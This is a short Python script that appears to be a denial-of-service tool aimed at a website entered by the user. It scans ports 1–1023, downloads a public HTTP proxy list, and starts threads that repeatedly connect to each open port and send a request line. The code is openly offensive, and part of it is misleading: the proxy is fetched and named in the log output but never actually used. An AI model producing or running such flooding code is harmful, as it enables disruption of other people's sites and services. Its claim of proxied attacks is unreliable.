import requests
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

def attack(url, port, proxy):
    while True:
        try:
            s = socket.create_connection((url, port))
            s.sendto("GET / HTTP/1.1\r\n".encode("utf-8"), (url, port))
            response = s.recv(1024)
            print(f"Attacking {url}:{port} through {proxy} - Response: {response.decode('utf-8')}")
        except Exception as e:
            print(f"Error attacking {url}:{port} - {e}")

def find_open_ports(url):
    open_ports = []
    for port in range(1, 1024):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((url, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def main():
    url = input("Enter the target website URL: ")
    open_ports = find_open_ports(url)
    print(f"Open ports on {url}: {open_ports}")

    proxy_response = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
    proxy_list = proxy_response.text.split('\r\n')[:-1]

    with ThreadPoolExecutor() as executor:
        for port in open_ports:
            proxy = proxy_list.pop(0) if proxy_list else None
            executor.submit(attack, url, port, proxy)

if __name__ == "__main__":
    main()
